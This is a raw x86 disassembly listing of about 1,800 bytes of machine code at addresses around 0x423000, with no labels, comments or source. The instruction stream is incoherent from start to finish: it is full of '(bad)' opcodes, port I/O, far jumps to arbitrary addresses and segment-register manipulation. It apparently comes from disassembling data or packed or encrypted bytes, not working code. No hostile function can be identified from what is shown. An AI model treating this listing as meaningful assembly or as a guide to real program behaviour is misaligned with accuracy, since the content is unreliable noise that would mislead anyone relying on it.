  422fdc:	cmc    
  422fdd:	or     dh,al
  422fdf:	adc    esp,0xa6f2dc9f
  422fe5:	ins    DWORD PTR es:[edi],dx
  422fe6:	add    esp,DWORD PTR [edx]
  422fe8:	in     eax,dx
  422fe9:	pop    ss
  422fea:	jmp    0x479c8cdb
  422fef:	(bad)  
  422ff1:	mov    esp,0xa42e4b36
  422ff6:	popf   
  422ff7:	rcl    DWORD PTR [ebx+0x1f],1
  422ffa:	ja     0x423020
  422ffc:	add    ch,BYTE PTR [ebp-0xe32d6e2]
  423002:	cwde   
  423003:	adc    al,0xe0
  423005:	push   ds
  423006:	out    0xc9,eax
  423008:	outs   dx,BYTE PTR ds:[esi]
  423009:	lea    eax,[ecx-0x4b]
  42300c:	mov    eax,ds:0x57757912
  423011:	out    0xc3,al
  423013:	mov    BYTE PTR [ecx-0x55d4efbc],dl
  423019:	mov    ebx,0xf7e2c67b
  42301e:	mov    esi,0x3d94376b
  423023:	test   al,0xe1
  423025:	jae    0x42306b
  423027:	jns    0x423098
  423029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42302a:	into   
  42302b:	jne    0x423048
  42302d:	arpl   si,cx
  42302f:	jno    0x423038
  423031:	call   0x798a192b
  423036:	push   cs
  423037:	pop    eax
  423038:	gs jae 0x423048
  42303b:	ds add al,0xbc
  42303e:	fidivr DWORD PTR [esi+0x685dc21c]
  423044:	icebp  
  423045:	mov    eax,0xab343712
  42304a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42304b:	or     eax,0xfdb945c7
  423050:	lock test al,0xf7
  423053:	jecxz  0x42301b
  423055:	pop    edx
  423056:	mov    ch,0x48
  423058:	ins    DWORD PTR es:[edi],dx
  423059:	cmc    
  42305a:	rcl    al,0x63
  42305d:	retf   0x8c3d
  423060:	jl     0x423008
  423062:	mov    edx,0x9f5cc6
  423067:	leave  
  423068:	mov    ch,0x40
  42306a:	sbb    al,0x8f
  42306c:	out    dx,al
  42306d:	pop    ebp
  42306e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42306f:	push   ebx
  423070:	aaa    
  423071:	pop    edx
  423072:	enter  0x991e,0x76
  423076:	fs mov edi,0x899188d4
  42307c:	mov    al,0x9f
  42307e:	jne    0x423034
  423080:	call   0x87ba97e7
  423085:	mov    esp,DWORD PTR [eax+ecx*8]
  423088:	gs ins DWORD PTR es:[edi],dx
  42308a:	adc    eax,ebp
  42308c:	push   ebp
  42308d:	in     al,dx
  42308e:	jns    0x423047
  423090:	or     DWORD PTR ds:0xfeb0836c,0xffffffaf
  423097:	fnstcw WORD PTR [ebx]
  423099:	cmp    DWORD PTR [ebx+0x6],0x79d65a54
  4230a0:	push   edi
  4230a1:	shl    BYTE PTR [ebx],cl
  4230a3:	sbb    dh,bh
  4230a5:	or     eax,0xa342da73
  4230aa:	mov    BYTE PTR [ecx+ebp*8-0x17],bl
  4230ae:	lods   eax,DWORD PTR ds:[esi]
  4230af:	gs inc ebx
  4230b1:	mov    esi,0xa0f95879
  4230b6:	pop    edi
  4230b7:	pop    ss
  4230b8:	pop    ebp
  4230b9:	adc    al,0xaa
  4230bb:	(bad)
  4230bf:	jns    0x423065
  4230c1:	pop    ds
  4230c2:	(bad)  
  4230c3:	shl    BYTE PTR [ecx-0x1f],1
  4230c6:	je     0x423056
  4230c8:	add    BYTE PTR [edi+ecx*4],cl
  4230cb:	shl    DWORD PTR [edx],cl
  4230cd:	sahf   
  4230ce:	and    esi,DWORD PTR [edi-0x3ce6295f]
  4230d4:	hlt    
  4230d5:	push   0xffffffbf
  4230d7:	(bad)  
  4230d8:	shrd   DWORD PTR [ebp-0x7],esp,cl
  4230dc:	mov    esi,0x21b39e8a
  4230e1:	pop    ds
  4230e2:	dec    esp
  4230e3:	(bad)  
  4230e4:	xor    edi,DWORD PTR [edx+0x33d47646]
  4230ea:	adc    BYTE PTR [ebp+0x6a3b07e6],0xbc
  4230f1:	outs   dx,BYTE PTR ds:[esi]
  4230f2:	sub    al,0xff
  4230f4:	or     eax,DWORD PTR [ebp-0x1ab6ec0c]
  4230fa:	fisub  WORD PTR [ebp-0x1b732eec]
  423100:	push   ds
  423101:	mov    ebx,DWORD PTR [ebx]
  423103:	fisttp DWORD PTR fs:[ecx-0x272cb66e]
  42310a:	mov    al,ds:0xb4c0fe22
  42310f:	lods   eax,DWORD PTR ds:[esi]
  423110:	xchg   esi,eax
  423111:	(bad)  
  423112:	jge    0x42314a
  423114:	lds    esp,FWORD PTR [eax]
  423116:	and    bl,BYTE PTR [ebx+0x4a129d0a]
  42311c:	pushf  
  42311d:	mov    fs,WORD PTR [eax-0x4a]
  423120:	stc    
  423121:	in     eax,0x24
  423123:	rcl    BYTE PTR [eax],0xd4
  423126:	aad    0x78
  423128:	in     al,0x34
  42312a:	xor    BYTE PTR [edx],0x2d
  42312d:	(bad)  
  42312e:	out    dx,al
  42312f:	fucompp 
  423131:	pop    edx
  423132:	push   es
  423133:	retf   0x58c
  423136:	inc    esp
  423137:	sub    al,0x62
  423139:	sti    
  42313a:	fwait
  42313b:	imul   ebx,esi,0x53e9f98b
  423141:	dec    al
  423143:	sti    
  423144:	fs xor al,0xb
  423147:	fcomp  DWORD PTR [eax-0x28]
  42314a:	dec    ebx
  42314b:	jns    0x42314a
  42314d:	inc    ebp
  42314e:	je     0x4230f8
  423150:	retf   
  423151:	stos   DWORD PTR es:[edi],eax
  423152:	and    eax,0x5f78edfb
  423157:	ins    BYTE PTR es:[edi],dx
  423158:	sub    eax,0x309b1f23
  42315d:	retf   0x41b3
  423160:	inc    esi
  423161:	ret    
  423162:	mov    ah,0x4a
  423164:	in     eax,dx
  423165:	shl    DWORD PTR [edi],0xbb
  423168:	push   ecx
  423169:	jnp    0x4231bc
  42316b:	or     eax,eax
  42316d:	int    0x7a
  42316f:	xchg   eax,ebp
  423171:	and    DWORD PTR [esi],edi
  423173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423174:	into   
  423175:	xchg   edi,eax
	...
  4231ba:	add    BYTE PTR [eax],al
  4231bc:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  4231c0:	out    dx,eax
  4231c1:	(bad)  
  4231c2:	cmp    esi,esi
  4231c4:	repnz sahf 
  4231c6:	mov    ebx,0x89997223
  4231cb:	mov    cl,0x91
  4231cd:	sbb    al,BYTE PTR [ecx]
  4231cf:	add    BYTE PTR [edx],ah
  4231d1:	pop    es
  4231d2:	add    BYTE PTR [eax],al
  4231d4:	stos   DWORD PTR es:[edi],eax
  4231d5:	mov    dl,0x43
  4231d7:	jmp    0x4231c3
  4231d9:	fs retf 
  4231db:	fcmovnb st,st(2)
  4231dd:	and    DWORD PTR [ebx+ebx*4-0x47],ebp
  4231e1:	push   eax
  4231e2:	in     eax,dx
  4231e3:	pop    ecx
  4231e4:	out    0x93,eax
  4231e6:	mov    dh,BYTE PTR [ebx-0x3de16918]
  4231ec:	lahf   
  4231ed:	loopne 0x4231d6
  4231ef:	dec    ebp
  4231f0:	add    BYTE PTR [ecx],al
  4231f2:	fld    QWORD PTR [ebx]
  4231f4:	pop    esi
  4231f5:	sti    
  4231f6:	mov    eax,0xb7060366
  4231fb:	outs   dx,BYTE PTR ds:[esi]
  4231fc:	inc    ebp
  4231fd:	push   ss
  4231fe:	jno    0x42321e
  423200:	pop    edi
  423201:	and    ch,BYTE PTR [ecx+0x624c6d19]
  423207:	rcl    DWORD PTR [edx],0x72
  42320a:	adc    dh,BYTE PTR [ebp-0x38bdeb2c]
  423210:	(bad)  
  423211:	repz pusha 
  423213:	mov    DWORD PTR [ebx],esi
  423215:	push   esi
  423216:	and    eax,DWORD PTR [ebx-0x266b696d]
  42321c:	or     esp,edx
  42321e:	fwait
  42321f:	mov    ebx,0x27d4259b
  423224:	fild   WORD PTR [ebp+0x63]
  423227:	mov    dl,0x11
  423229:	sbb    ch,cl
  42322b:	push   edi
  42322c:	adc    cl,BYTE PTR [edx-0x576f6df8]
  423232:	adc    BYTE PTR [edx],ah
  423234:	inc    eax
  423235:	pushf  
  423236:	out    0x75,eax
  423238:	cmp    eax,0xd55b6420
  42323d:	call   0x301140d0
  423242:	xlat   BYTE PTR ds:[ebx]
  423243:	adc    al,0xb0
  423245:	mov    DWORD PTR [edx+eiz*2],eax
  423248:	fs adc al,0x0
  42324b:	dec    ebp
  42324c:	outs   dx,DWORD PTR ds:[esi]
  42324d:	sbb    eax,0x49fbc1c0
  423252:	jb     0x423289
  423254:	and    bh,ch
  423256:	mov    edi,0xb51e11ac
  42325b:	std    
  42325c:	pop    ds
  42325d:	pop    eax
  42325e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42325f:	stos   BYTE PTR es:[edi],al
  423260:	sbb    DWORD PTR [ecx+0x1a77ce4f],ebp
  423266:	leave  
  423267:	jnp    0x423255
  423269:	cmp    edx,DWORD PTR [ecx+edi*1+0xbc11b23]
  423270:	push   ss
  423271:	aad    0x5c
  423273:	sahf   
  423274:	push   ecx
  423275:	inc    edi
  423276:	push   ss
  423277:	stc    
  423278:	mov    BYTE PTR [ebx+0x8],ah
  42327b:	sub    BYTE PTR [esi+ebp*2],cl
  42327e:	and    ebp,esi
  423280:	nop
  423281:	xor    DWORD PTR [ebp-0x60a9d9bd],ebp
  423287:	mov    cl,0xbe
  423289:	jecxz  0x4232e4
  42328b:	adc    DWORD PTR [esi-0x61f8c03e],ecx
  423291:	dec    eax
  423292:	jno    0x423256
  423294:	fsubrp st(1),st
  423296:	cli    
  423297:	mov    eax,ds:0x38d918aa
  42329c:	aam    0xfc
  42329e:	pop    ds
  42329f:	fisttp QWORD PTR [ebp-0x6fc73a5c]
  4232a5:	js     0x423312
  4232a7:	add    eax,0xf2c8647a
  4232ac:	pop    eax
  4232ad:	outs   dx,DWORD PTR ds:[esi]
  4232ae:	out    dx,eax
  4232af:	sbb    eax,0x8d102724
  4232b4:	sub    bh,BYTE PTR [ecx]
  4232b6:	pop    edi
  4232b7:	out    0x21,eax
  4232b9:	int3   
  4232ba:	xchg   edi,eax
  4232bb:	lahf   
  4232bc:	fdivr  QWORD PTR [ecx+0x53]
  4232bf:	test   al,0xe4
  4232c1:	ret    
  4232c2:	scas   eax,DWORD PTR es:[edi]
  4232c3:	jmp    0x8640:0x99d02dfe
  4232ca:	or     al,0xed
  4232cc:	in     eax,dx
  4232cd:	jmp    0x77cd:0x1ffcc9e2
  4232d4:	sub    DWORD PTR [esi],0xc
  4232d7:	xchg   edi,eax
  4232d8:	scas   al,BYTE PTR es:[edi]
  4232d9:	sbb    dh,ah
  4232db:	jb     0x42329b
  4232dd:	pop    ebp
  4232de:	sbb    BYTE PTR ds:0xeb2312ce,dh
  4232e4:	aad    0x48
  4232e6:	jb     0x42334e
  4232e8:	pop    DWORD PTR ds:0xff092e68
  4232ee:	add    al,0x97
  4232f0:	push   cs
  4232f1:	(bad)  
  4232f2:	push   edx
  4232f3:	in     eax,0xbf
  4232f5:	enter  0x34c3,0xf7
  4232f9:	std    
  4232fa:	mov    ecx,0xa3258511
  4232ff:	fwait
  423300:	int3   
  423301:	mov    ds,edi
  423303:	mov    esi,0x2d18990e
  423308:	pop    esi
  423309:	cmp    eax,edi
  42330b:	mov    ?,esp
  42330d:	and    DWORD PTR [ebx+0x7614887b],ecx
  423313:	nop    esp
  423316:	cmp    esi,DWORD PTR [ebp+0x25d1e7af]
  42331c:	pop    ebp
  42331d:	jne    0x4232a3
  42331f:	pop    es
  423320:	mov    ch,ah
  423322:	lds    ecx,FWORD PTR [ecx+0x6785b7d4]
  423328:	dec    eax
  423329:	bound  ebx,QWORD PTR [esi+ebp*4-0x1a8a3225]
  423330:	mov    esi,DWORD PTR [edi-0x79]
  423333:	and    edi,0x71
  423336:	popf   
  423337:	dec    esp
  423338:	pusha  
  423339:	dec    eax
  42333a:	loopne 0x42332c
  42333c:	cli    
  42333d:	jg     0x423301
  42333f:	push   0x44
  423341:	push   0x24fa2e22
  423346:	adc    eax,ebx
  423348:	sub    BYTE PTR [ebp-0x26],dh
  42334b:	out    0xd7,eax
  42334d:	(bad)  
  42334e:	mov    ebx,0x7f54bd83
  423353:	shr    dl,1
  423355:	xchg   ebx,eax
  423356:	ins    BYTE PTR es:[edi],dx
  423357:	pusha  
  423358:	inc    edi
  423359:	ficomp DWORD PTR [esi+0x42a3e46e]
  42335f:	jb     0x423348
  423361:	out    dx,al
  423362:	push   edi
  423363:	mov    esp,0xf5d1d51b
  423368:	jge    0x423364
  42336a:	stc    
  42336b:	rol    BYTE PTR ds:0x684a2950,cl
  423371:	shl    DWORD PTR [ecx-0x6432d99],1
  423377:	loope  0x423395
  423379:	fwait
  42337a:	lea    edi,[ebx]
  42337c:	test   eax,0x47779ba9
  423381:	xor    edx,DWORD PTR ds:0x9054dfbe
  423387:	(bad)  
  423388:	or     DWORD PTR [esi],edx
  42338a:	mov    WORD PTR [eax+0x50],gs
  42338d:	fstp   DWORD PTR [ecx-0xe]
  423390:	jns    0x423347
  423392:	add    ebp,0x6c52b384
  423398:	push   ebx
  423399:	es scas eax,DWORD PTR es:[edi]
  42339b:	shl    DWORD PTR [eax],0xbd
  42339e:	jl     0x4233f0
  4233a0:	fistp  QWORD PTR [ebp+0x1d611eb1]
  4233a6:	sub    eax,0x324c40d0
  4233ab:	cmp    eax,0xfca39613
  4233b0:	inc    esp
  4233b1:	das    
  4233b2:	enter  0x83ce,0x6
  4233b6:	or     BYTE PTR [ebx+0x7c],cl
  4233b9:	pushf  
  4233ba:	in     al,0x21
  4233bc:	inc    esp
  4233bd:	add    edx,DWORD PTR [eax+eax*4]
  4233c0:	jbe    0x423394
  4233c2:	jmp    0x7458:0x10fb9da3
  4233c9:	dec    ebx
  4233ca:	push   ebx
  4233cb:	or     al,0x83
  4233cd:	jmp    0x4233e6
  4233cf:	setne  bl
  4233d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233d3:	sub    cl,BYTE PTR [eax*1+0x738593a7]
  4233da:	or     ecx,DWORD PTR [ebx+edi*1]
  4233dd:	(bad)  
  4233de:	std    
  4233df:	int3   
  4233e0:	jge    0x4233f4
  4233e2:	stos   BYTE PTR es:[edi],al
  4233e3:	aaa    
  4233e4:	and    eax,0x9bf172ea
  4233e9:	shl    al,cl
  4233eb:	mov    bh,0xed
  4233ed:	mov    ds:0x7dd660e3,al
  4233f2:	stc    
  4233f3:	mov    ebx,0x503154f1
  4233f8:	and    DWORD PTR [ebx+0x1b],esi
  4233fb:	je     0x42340c
  4233fd:	jne    0x423447
  4233ff:	loopne 0x423412
  423401:	sbb    bl,bl
  423403:	cli    
  423404:	ins    BYTE PTR es:[edi],dx
  423405:	pop    ss
  423406:	xor    DWORD PTR [ebp-0x555cd36d],ecx
  42340c:	xchg   edi,eax
  42340d:	pop    ds
  42340e:	(bad)  
  423410:	sbb    ecx,DWORD PTR [ebp+0x75]
  423413:	(bad)  
  423415:	mov    edi,0xf5eaf2cd
  42341a:	lds    esp,FWORD PTR ds:0x63b1be93
  423420:	in     al,0xab
  423422:	dec    eax
  423423:	add    al,0xa1
  423425:	nop
  423426:	pop    ss
  423427:	nop
  423428:	sub    eax,0xc7f88d4f
  42342d:	dec    ebp
  42342e:	pop    ebx
  42342f:	mov    eax,ds:0xb40ce202
  423434:	or     eax,0x40fc97d8
  423439:	popf   
  42343a:	sbb    esp,DWORD PTR [eax-0x7c7aa3c3]
  423440:	std    
  423441:	int    0xa1
  423443:	sar    DWORD PTR cs:[ebp+0x4ea7a4ad],1
  42344a:	sbb    DWORD PTR [ebx-0x39],edi
  42344d:	pop    ds
  42344e:	aaa    
  42344f:	fucom  st(5)
  423451:	or     eax,0x3ec4ea12
  423456:	inc    esp
  423457:	outs   dx,DWORD PTR ds:[esi]
  423458:	pop    ebx
  423459:	ficomp DWORD PTR [ecx+0x2a171ed7]
  42345f:	mov    edx,gs
  423461:	xchg   ebx,eax
  423462:	imul   edx,DWORD PTR [esi-0x1d],0x3d
  423466:	add    esp,edi
  423468:	cwde   
  423469:	push   ds
  42346a:	fistp  DWORD PTR [edi-0x73089ff8]
  423470:	fistp  WORD PTR [edi+0x63]
  423473:	dec    ebp
  423474:	and    BYTE PTR [ebx-0x47],bl
  423477:	call   0x16a4082b
  42347c:	ins    DWORD PTR es:[edi],dx
  42347d:	lahf   
  42347e:	sahf   
  42347f:	xor    eax,0xc02d74d1
  423484:	call   0x2f74:0x6cf8a554
  42348b:	adc    al,0x90
  42348d:	fdiv   QWORD PTR [ebx-0x9b02cc8]
  423493:	xchg   esp,eax
  423494:	in     al,0x54
  423496:	int3   
  423497:	push   0x7548466d
  42349c:	hlt    
  42349d:	iret   
  42349e:	(bad)  
  42349f:	dec    edx
  4234a0:	cmp    BYTE PTR [edx+0x25],0x65
  4234a4:	jns    0x4234e5
  4234a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234a7:	xor    al,0x2e
  4234a9:	stc    
  4234aa:	inc    esp
  4234ab:	jecxz  0x423463
  4234ad:	mov    ah,0x2d
  4234af:	xor    al,0x22
  4234b1:	out    dx,eax
  4234b2:	test   al,0x76
  4234b4:	int    0x92
  4234b6:	push   ecx
  4234b7:	sub    ebp,DWORD PTR [esi+0x616c6c27]
  4234bd:	adc    bh,BYTE PTR [ebp-0x2e7978af]
  4234c3:	loope  0x4234d9
  4234c5:	movzx  ecx,WORD PTR [ebp-0x54]
  4234c9:	les    esi,FWORD PTR [ecx-0x5b]
  4234cc:	mov    ecx,0x49b70dc3
  4234d1:	cmp    BYTE PTR [edx+0x501fc1ba],al
  4234d7:	call   0x75522572
  4234dc:	imul   ecx,ebx,0x5cabbd43
  4234e2:	xor    BYTE PTR [ecx+0x39],ah
  4234e5:	fadd   QWORD PTR [ebx]
  4234e7:	aad    0x98
  4234e9:	ud0    esp,ecx
  4234ec:	pusha  
  4234ed:	inc    ecx
  4234ee:	pop    esp
  4234ef:	inc    esi
  4234f0:	es mov edi,esi
  4234f3:	mov    ds:0x98db0b78,al
  4234f8:	or     al,0x49
  4234fa:	pop    ecx
  4234fb:	xor    edi,DWORD PTR [eax-0x6b]
  4234fe:	mov    ds:0xb656aa3,al
  423503:	inc    esi
  423504:	(bad)  
  423505:	fild   DWORD PTR [ebx-0x5]
  423508:	in     eax,dx
  423509:	jge    0x4234f2
  42350b:	push   ecx
  42350c:	loop   0x42353c
  42350e:	fidivr WORD PTR [esi]
  423510:	test   BYTE PTR [edx],0x8f
  423513:	jo     0x42358d
  423515:	and    al,0xac
  423517:	mov    ebx,0xcb76f7ff
  42351c:	inc    esp
  42351d:	jo     0x42355f
  42351f:	sbb    dh,bh
  423521:	mov    esp,0x8a632ffe
  423526:	ret    
  423527:	repnz aad 0xe4
  42352a:	repz push eax
  42352c:	call   0xec36db64
  423531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423532:	mov    dh,0xc4
  423534:	cmp    ecx,DWORD PTR [edx+0x67]
  423537:	pop    es
  423538:	mov    ebp,0x1f5075aa
  42353d:	aas    
  42353e:	fistp  QWORD PTR [esi]
  423540:	(bad)  
  423541:	xor    al,dl
  423543:	jns    0x423517
  423545:	ret    
  423546:	adc    edx,DWORD PTR [ecx+0x3a51015c]
  42354c:	aam    0x1a
  42354e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42354f:	push   cs
  423550:	push   0xfffffff1
  423552:	fisttp WORD PTR [ebx]
  423554:	and    esp,ecx
  423556:	and    BYTE PTR [edi],bh
  423558:	bound  ebp,QWORD PTR [edi-0x5620d85a]
  42355e:	lods   eax,DWORD PTR ds:[esi]
  42355f:	sbb    eax,0x71a2b0ce
  423564:	and    eax,0xc232fa5f
  423569:	inc    esi
  42356a:	mov    ds:0x8000ec81,al
  42356f:	cmp    ah,BYTE PTR [edx+0x41]
  423572:	mov    cl,0x70
  423574:	add    al,0x38
  423576:	sub    al,0xa1
  423578:	cmp    edx,DWORD PTR [ecx]
  42357a:	jno    0x166db0d
  423580:	cmc    
  423581:	push   cs
  423582:	pop    ebx
  423583:	mov    eax,ds:0x13b9f154
  423588:	mov    al,0xa2
  42358a:	dec    esi
  42358b:	dec    ecx
  42358c:	mov    eax,ds:0xd42453c3
  423591:	xchg   BYTE PTR [edx-0x26],cl
  423594:	push   ss
  423595:	push   0x6f
  423597:	dec    edi
  423598:	jmp    DWORD PTR [esi+0x601ab8ad]
  42359e:	cld    
  42359f:	fwait
  4235a0:	pop    es
  4235a1:	add    bl,BYTE PTR [ecx+0x11ce3dc6]
  4235a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235a8:	sub    al,0x2b
  4235aa:	push   ebx
  4235ab:	jle    0x42362b
  4235ad:	sub    BYTE PTR [ebp+0x4c],al
  4235b0:	fsubr  QWORD PTR [edi+eiz*2-0x67]
  4235b4:	inc    ebx
  4235b5:	(bad)  
  4235b6:	push   ecx
  4235b7:	xchg   edi,esi
  4235b9:	pop    ebx
  4235ba:	and    DWORD PTR [ecx-0x4],eax
  4235bd:	adc    DWORD PTR [ebx+eax*4],ebp
  4235c0:	cld    
  4235c1:	fwait
  4235c2:	ins    DWORD PTR es:[edi],dx
  4235c3:	jg     0x423582
  4235c5:	pop    ds
  4235c6:	cld    
  4235c7:	retf   
  4235c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235c9:	xchg   edx,eax
  4235ca:	fcmovne st,st(3)
  4235cc:	stc    
  4235cd:	push   eax
  4235ce:	loopne 0x4235c0
  4235d0:	clc    
  4235d1:	das    
  4235d2:	sbb    esp,edx
  4235d4:	mov    dh,0xd9
  4235d6:	mov    ebp,0xd7eec76
  4235db:	mov    dh,0xa8
  4235dd:	and    DWORD PTR [edx],ebx
  4235df:	test   ch,al
  4235e1:	aad    0xe6
  4235e3:	xchg   eax,ecx
  4235e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235e6:	sbb    BYTE PTR [edx],dh
  4235e8:	fisttp DWORD PTR [ecx+0x19f4c19b]
  4235ee:	fistp  DWORD PTR [esi]
  4235f0:	out    0x29,eax
  4235f2:	mov    ch,0x26
  4235f4:	mov    BYTE PTR [ebp-0x45183e53],bl
  4235fa:	add    eax,0xec998daa
  4235ff:	dec    ebx
  423600:	add    al,0xd9
  423602:	lds    ecx,FWORD PTR [eax+0x32]
  423605:	push   ecx
  423606:	call   0x1a1557f8
  42360b:	jge    0x423681
  42360d:	jecxz  0x423605
  42360f:	mov    al,0xc9
  423611:	dec    ecx
  423612:	mov    ecx,0x704f9929
  423617:	push   ds
  423618:	pop    edx
  423619:	and    bl,ch
  42361b:	retf   0x420
  42361e:	push   eax
  42361f:	push   ebx
  423620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423621:	and    bl,BYTE PTR [esi+0x11305532]
  423627:	and    BYTE PTR [ebx-0x66bd29ca],bh
  42362d:	std    
  42362e:	mov    ah,0x2c
  423630:	mov    bh,0x19
  423632:	fldenv [edx+0x58]
  423635:	cld    
  423636:	xor    eax,edi
  423638:	add    cl,BYTE PTR [eax+0x41]
  42363b:	push   edx
  42363c:	mov    ds:0xd9d7e9d6,eax
  423641:	pushf  
  423642:	sub    dh,dh
  423644:	push   esi
  423645:	add    edx,DWORD PTR [edi-0x62f38b19]
  42364b:	inc    edi
  42364c:	ds sbb eax,0x9ccd00f9
  423652:	scas   al,BYTE PTR es:[edi]
  423653:	nop
  423654:	jmp    0x423620
  423656:	mov    bh,0xaa
  423658:	sbb    DWORD PTR [edx-0x3d],eax
  42365b:	retf   0xf784
  42365e:	adc    al,0x27
  423660:	ret    0x2138
  423663:	ror    DWORD PTR [ebx-0x24],1
  423666:	jns    0x423659
  423668:	jae    0x42360a
  42366a:	inc    DWORD PTR [esp+ecx*8-0x3594886c]
  423671:	adc    BYTE PTR [ecx+esi*8],0xc4
  423675:	mov    dl,0x70
  423677:	jns    0x423693
  423679:	add    bh,BYTE PTR cs:[ebx-0x62]
  42367d:	arpl   WORD PTR [ebp-0x5f2415a4],cx
  423683:	rcr    DWORD PTR [edx+0x4e0a8734],1
  423689:	test   DWORD PTR [esi-0x1bc91579],ebx
  42368f:	iret   
  423690:	push   cs
  423691:	js     0x42364e
  423693:	sbb    eax,0xb12b2052
  423698:	lea    esp,[edx+0x43a9abde]
  42369e:	(bad)  
  42369f:	fstp   QWORD PTR [edx+0x16ffdb7c]
  4236a5:	aad    0x77
  4236a7:	std    
  4236a8:	xchg   ecx,eax
  4236a9:	fs loope 0x4236c4
  4236ac:	fdiv   DWORD PTR [ebp-0x4e6330eb]
  4236b2:	mov    ah,0x22
  4236b4:	out    dx,al
  4236b5:	pushf  
  4236b6:	retf   0xa151
  4236b9:	ror    DWORD PTR [edx],0x6a
  4236bc:	mov    ecx,0xd340ec87
  4236c1:	cld    
  4236c2:	imul   edx,DWORD PTR [edx],0xec4daed9
  4236c8:	push   eax
  4236c9:	jg     0x4236e2
  4236cb:	xor    al,0x36
  4236cd:	or     DWORD PTR [esi-0x5e],ebx
  4236d0:	sbb    eax,0x4f4502a9
  4236d5:	out    0x6d,eax
  4236d7:	sub    al,0xca
  4236d9:	add    al,0x56
  4236db:	or     DWORD PTR [esi-0x76],ebp
  4236de:	cmp    eax,0xc464960c
  4236e3:	sbb    ebp,DWORD PTR [ecx-0x11]
  4236e6:	inc    ebp
  4236e7:	add    eax,0x4dd0a00
  4236ec:	fidiv  WORD PTR [ebx]
  4236ee:	push   eax
  4236ef:	pusha  
  4236f0:	mov    bl,bh
  4236f2:	jge    0x4236e7
  4236f4:	(bad)  
  4236f5:	cmp    eax,0x63917ecc
  4236fa:	xor    edx,DWORD PTR [eax-0x4e994769]
  423700:	bound  esp,QWORD PTR [ebp+eax*1+0x54]
  423704:	adc    ecx,DWORD PTR [ebp-0x707599ca]
  42370a:	jno    0x4236fc
  42370c:	and    ah,BYTE PTR [edi-0x72]
  42370f:	ss pop edi
  423711:	push   esp
  423712:	jae    0x4236ba
  423714:	sbb    eax,0x7e9766f8
  423719:	outs   dx,DWORD PTR ds:[esi]
  42371a:	xchg   ecx,eax
  42371b:	adc    ah,ah
  42371d:	xchg   DWORD PTR [ebp+eax*8-0x559d0c59],ebp
  423724:	fidivr DWORD PTR [ebp+0x5]
  423727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423728:	xchg   edx,eax
  423729:	push   0xfd1cc5dc
  42372e:	push   edi
  42372f:	dec    esp
  423730:	add    al,0x21
  423732:	mov    esp,DWORD PTR ds:0x2f7d7552
  423738:	xchg   edx,eax
  423739:	xchg   esi,eax
  42373a:	pop    ebp
  42373b:	lods   eax,DWORD PTR ds:[esi]
  42373c:	(bad)  
  42373d:	repnz mov ebp,es
  423740:	fisub  DWORD PTR [edi]
  423742:	jecxz  0x4236d0
  423744:	dec    ecx
  423745:	jbe    0x4237bf
  423747:	dec    esp
  423748:	cmp    dh,BYTE PTR [esi]
  42374a:	lock pop edx
  42374c:	jns    0x423725
  42374e:	or     eax,0xd503d1ed
  423753:	test   al,0x90
  423755:	out    dx,al
  423756:	inc    ecx
  423757:	mov    edx,0x5b94c3d7
  42375c:	jno    0x42373e
  42375e:	xchg   ebx,eax
  42375f:	xchg   ebx,eax
  423760:	(bad)  
  423761:	and    bh,ch
  423763:	aaa    
  423764:	retf   0x94c4
  423767:	in     al,0xab
  423769:	xor    DWORD PTR [edx-0x53],edx
  42376c:	jmp    0x423757
  42376e:	imul   ebp,DWORD PTR [eax*2-0x7519ffde],0xffffffe2
  423776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423778:	mov    bl,0x1d
  42377a:	icebp  
  42377b:	mov    edi,0x3c52677
  423780:	test   DWORD PTR [ecx-0x4f],ebp
  423783:	mov    bh,0x86
  423785:	cli    
  423786:	sub    al,0x33
  423788:	mov    ?,ebp
  42378a:	mov    ah,ah
  42378c:	shr    BYTE PTR [edi],0xfc
  42378f:	xchg   ebx,eax
  423790:	adc    dl,BYTE PTR cs:[edx]
  423793:	lds    ecx,FWORD PTR ds:0x46fb7454
  423799:	cld    
  42379a:	push   ecx
  42379b:	lock mov ds:0xe8b64dc,eax
  4237a1:	(bad)  [esi+0x6d]
  4237a4:	push   cs
  4237a5:	das    
  4237a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237a7:	sbb    edi,esi
  4237a9:	outs   dx,DWORD PTR ds:[esi]
  4237aa:	xor    DWORD PTR [esi+0x661fa2a5],ebx
  4237b0:	nop
  4237b1:	or     al,0xfb
  4237b3:	test   al,0x29
  4237b5:	cwde   
  4237b6:	rcl    ch,1
  4237b8:	retf   
  4237b9:	shl    BYTE PTR [ecx+0x19],cl
  4237bc:	ins    DWORD PTR es:[edi],dx
  4237bd:	xchg   edi,eax
  4237be:	push   0xff5f3ed5
  4237c3:	dec    ebp
  4237c4:	adc    ecx,DWORD PTR [ecx]
  4237c6:	ror    BYTE PTR [ecx],1
  4237c8:	pop    edi
  4237c9:	or     al,BYTE PTR [esi]
  4237cb:	fld    st(0)
  4237cd:	xor    eax,0xd4e7a1bb
  4237d2:	fimul  WORD PTR [ebp-0x10]
  4237d5:	dec    ebx
  4237d6:	out    dx,al
  4237d7:	sub    esp,ebx
  4237d9:	jge    0x4237c0
  4237db:	mov    bh,0x0
  4237dd:	jmp    0x4237b3
  4237df:	cmp    al,BYTE PTR [ecx]
  4237e1:	push   0x31425c4f
  4237e6:	out    0xfd,eax
  4237e8:	add    DWORD PTR [esi+ecx*8],eax
  4237eb:	or     ebp,0x7c031438
  4237f1:	inc    esp
  4237f2:	xor    al,0x10
